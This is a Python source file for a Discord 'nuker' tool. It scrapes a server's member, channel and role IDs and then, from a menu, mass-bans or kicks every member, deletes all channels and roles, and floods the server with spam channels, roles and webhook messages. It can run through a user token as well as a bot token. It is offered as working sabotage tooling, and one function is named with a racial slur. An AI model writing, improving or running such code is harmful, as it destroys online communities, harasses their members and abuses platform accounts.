try:
  import os
  import sys 
  import logging 
  import random
  import discord
  import json 
  import time
  
  from tasksio import TaskPool
  from aiohttp import ClientSession 
  from discord.ext import commands
  from asyncio import sleep
except (ModuleNotFoundError) as error:
  print(error)
  os.system("pip install tasksio")
  os.system("pip install discord")
  os.system("cls; clear")
  print("""\033[38;5;205m╔═════\033[38;5;206m[\033[38;5;204mzeus@Krypton\033[38;5;206m]
\033[38;5;206m╚═══> Installed Requirements Restart The Program To Continue.""")
  time.sleep(3)
  os._exit(0)

os.system("mode 85,20")

if sys.platform == "win32":
	clear = lambda: os.system("cls")
else:
	clear = lambda: os.system("clear")

logging.basicConfig(
  level=logging.INFO, 
  format="\033[38;5;206m[\033[38;5;204m%(asctime)s\033[38;5;206m] \033[0m%(message)s", 
  datefmt="%H:%M:%S",
)

client = commands.Bot(
  command_prefix="zeus on top",
  help_command=None,
  intents=discord.Intents.all()
)

with open("cache/settings.json") as f:
	settings = json.load(f)
token = settings.get("Token")
channel_names = settings.get("Channel Names")
role_names = settings.get("Role Names")
Webhook_users = settings.get("Webhook Names")
Webhook_contents = settings.get("Webhook Contents")
spam_amount = settings.get("Spam Amount")
tasks = settings.get("Threads")
bot = settings.get("Bot")

if bot:
  headers = {
    "Authorization": f"Bot {token}"
  }
else:
  headers = {
    "Authorization": token
  }
usercount = 0 
channelcount = 0 
rolecount = 0

clear()
try:
  guild = input("""\033[38;5;205m╔═════\033[38;5;206m[\033[38;5;204mGuild_ID?\033[38;5;206m]
\033[38;5;206m╚═══>  """)
  client.get_guild(int(guild))
except Exception:
  logging.info("Invalid guild id specified")
clear()

spam = input("""\033[38;5;205m╔═════\033[38;5;206m[\033[38;5;204mMass Ping?(true/false)\033[38;5;206m]
\033[38;5;206m╚═══>  """)
clear()

@client.event
async def on_connect():
  clear()
  await scrape_guild()
  await menu()


async def mass_ban(x):
  async with ClientSession(headers=headers) as session:
    async with session.put(
      f"https://discord.com/api/v{random.randint(6, 9)}/guilds/{guild}/bans/{x}"
    ) as s:
      if s.status in (200, 201, 204):
        logging.info(f"Banned member {x}")
      elif s.status == 429:
        load = await s.json()
        logging.info("Ratelimited for %s." % (load["retry_after"]))

async def mass_kick(x):
  async with ClientSession(headers=headers) as session:
    async with session.delete(
      f"https://discord.com/api/v9/guilds/{guild}/members/{x}"
    ) as s:
      if s.status in (200, 201, 204):
        logging.info(f"Kicked member {x}")
      elif s.status == 429:
        load = await s.json()
        logging.info("Ratelimited for %s." % (load["retry_after"]))

async def channel_delete(x):
  async with ClientSession(headers=headers) as session:
    async with session.delete(
      f"https://discord.com/api/v9/channels/{x}"
    ) as s:
      if s.status in (200, 201, 204):
        logging.info(f"Deleted channel {x}")
      elif s.status == 429:
        load = await s.json()
        logging.info("Ratelimited for %s." % (load["retry_after"]))

async def role_delete(x):
  async with ClientSession(headers=headers) as session:
    async with session.delete(
      f"https://discord.com/api/v9/guilds/{guild}/roles/{x}"
    ) as s:
      if s.status in (200, 201, 204):
        logging.info(f"Deleted role {x}")
      elif s.status == 429:
        load = await s.json()
        logging.info("Ratelimited for %s." % (load["retry_after"]))

async def channel_spam(x):
  async with ClientSession(headers=headers) as session:
    async with session.post(
      f"https://discord.com/api/v9/guilds/{guild}/channels",
      json={"name": random.choice(channel_names)}
    ) as s:
      if s.status in (200, 201, 204):
        logging.info(f"Created channel ({x})")
      elif s.status == 429:
        load = await s.json()
        logging.info("Ratelimited for %s." % (load["retry_after"]))

async def role_spam(x):
  async with ClientSession(headers=headers) as session:
    async with session.post(
      f"https://discord.com/api/v9/guilds/{guild}/roles",
      json={"name": random.choice(role_names)}
    ) as s:
      if s.status in (200, 201, 204):
        logging.info(f"Created role ({x})")
      elif s.status == 429:
        load = await s.json()
        logging.info("Ratelimited for %s." % (load["retry_after"]))


@client.listen("on_guild_channel_create")
async def niggers(channel):
  if spam == True or spam == "true" or spam == "True":
    try:
      webhook = await channel.create_webhook(name=random.choice(Webhook_users))
      for i in range(spam_amount):
        await webhook.send(random.choice(Webhook_contents))
        logging.info(f"Created and spammed webhook {i} times.")
      logging.info("Operation nuke successful.")
      await menu()
    except Exception:
      pass
  else:
    pass

async def menu():
  clear()
  print("""
                              \033[38;5;206m┌┼┐  ╔═╗╔═╗╦ ╦╔═╗  ┌┼┐
                              \033[38;5;205m└┼┐  ╔═╝║╣ ║ ║╚═╗  └┼┐
                              \033[38;5;204m└┼┘  ╚═╝╚═╝╚═╝╚═╝  └┼┘
                       \033[38;5;206m╚╦════════════════════════════════╦╝
                           \033[38;5;206m  ⚡ Thunderbolt Speed  ⚡
\033[38;5;206m[\033[38;5;204m?\033[38;5;206m] \033[0mSelect an operation below to continue\033[38;5;206m...
  \033[38;5;206m[ \033[38;5;204m1 \033[38;5;206m] \033[0m» Mass Ban 
  \033[38;5;206m[ \033[38;5;204m2 \033[38;5;206m] \033[0m» Mass Kick 
  \033[38;5;206m[ \033[38;5;204m3 \033[38;5;206m] \033[0m» Delete Channels 
  \033[38;5;206m[ \033[38;5;204m4 \033[38;5;206m] \033[0m» Delete Roles 
  \033[38;5;206m[ \033[38;5;204m5 \033[38;5;206m] \033[0m» Create Channels 
  \033[38;5;206m[ \033[38;5;204m6 \033[38;5;206m] \033[0m» Create Roles 
  \033[38;5;206m[ \033[38;5;204m7 \033[38;5;206m] \033[0m» Test Ban 
  \033[38;5;206m[ \033[38;5;204m8 \033[38;5;206m] \033[0m» Scrape
""")
  
  velocity = input("""\033[38;5;205m╔═════\033[38;5;206m[\033[38;5;204mzeus@Krypton\033[38;5;206m]
\033[38;5;206m╚═══>  """)
  
  if velocity == "1":
    clear()
    logging.info("Operating Function «Mass Ban»")
    users = open("cache/users.txt")
    async with TaskPool(tasks) as task:
      for x in users:
        await task.put(mass_ban(x))
    await menu()
    users.close()
  elif velocity == "2":
    clear()
    logging.info("Operating Function «Mass Kick»")
    users = open("cache/users.txt")
    async with TaskPool(tasks) as task:
      for x in users:
        await task.put(mass_kick(x))
    await menu()
    users.close()
  elif velocity == "3":
    clear()
    logging.info("Operating Function «Channel Delete»")
    channels = open("cache/channels.txt")
    async with TaskPool(tasks) as task:
      for x in channels:
        await task.put(channel_delete(x))
    await menu()
    channels.close()
  elif velocity == "4":
    clear()
    logging.info("Operating Function «Role Delete»")
    roles = open("cache/roles.txt")
    async with TaskPool(tasks) as task:
      for x in roles:
        await task.put(role_delete(x))
    await menu()
    roles.close()
  elif velocity == "5":
    clear()
    logging.info("Operating Function «Channel Create»")
    amount = input("""\033[38;5;205m╔═════\033[38;5;206m[\033[38;5;204mAmount?\033[38;5;206m]
\033[38;5;206m╚═══>  """)
    clear()
    async with TaskPool(tasks) as task:
      for x in range(int(amount)):
        await task.put(channel_spam(x))
    if spam == True or spam == "true" or spam == "True":
      pass
    else:
      await menu()
  elif velocity == "6":
    clear()
    logging.info("Operating Function «Role Create»")
    amount = input("""\033[38;5;205m╔═════\033[38;5;206m[\033[38;5;204mAmount?\033[38;5;206m]
\033[38;5;206m╚═══>  """)
    async with TaskPool(tasks) as task:
      for x in range(int(amount)):
        await task.put(role_spam)
    await menu()
  elif velocity == "7":
    clear()
    logging.info("Operating Function «Test Ban»")
    users = open("cache/ids.txt")
    async with TaskPool(tasks) as task:
      for x in users:
        await task.put(mass_ban(x))
    await menu()
  elif velocity == "8":
    clear()
    await scrape_guild()
    await menu()
  else:
    logging.info("Invalid choice retard.")
    await sleep(3)
    await menu()
    

async def scrape_guild():
  clear()
  try:
    await client.wait_until_ready()
    obj = client.get_guild(int(guild))
  except Exception as e:
    logging.info("Invalid Guild Id.")
    os._exit(0)
  
  try:
    os.remove("cache/users.txt")
    os.remove("cache/channels.txt")
    os.remove("cache/roles.txt")
  except Exception:
    pass
  
  global usercount
  with open("cache/users.txt", "a") as m:
    members = await obj.chunk()
    for member in members:
      m.write(str(member.id) + "\n")
      usercount += 1
    logging.info(f"Fetched {usercount} Bannable Members")
    m.close()
  
  global channelcount
  with open("cache/channels.txt", "a") as c:
    for channel in obj.channels:
      c.write(str(channel.id) + "\n")
      channelcount += 1
    logging.info(f"Fetched {channelcount} Deleteable Channels")
    c.close()
    
  global rolecount
  with open("cache/roles.txt", "a") as r:
    for role in obj.roles:
      r.write(str(role.id) + "\n")
      rolecount += 1
    logging.info(f"Fetched {rolecount} Deleteable Roles")
    r.close()
      
  await sleep(1.8)
  clear()


if __name__ == "__main__":
  try:
    client.run(
      token,
      bot=bot
    )
  except Exception:
    logging.info("Invalid Token.")
    os._exit(0)
